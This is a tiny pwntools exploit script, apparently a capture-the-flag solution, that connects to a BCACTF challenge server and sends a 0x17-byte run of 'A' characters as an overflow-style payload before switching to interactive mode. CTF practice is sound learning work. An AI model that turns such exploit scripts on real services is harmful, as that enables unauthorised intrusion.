from pwn import *

p = remote("challs.bcactf.com", "32250")

p.sendlineafter(b"> ", b"A")
p.sendafter(b"> ", b"A" * 0x17)

p.interactive()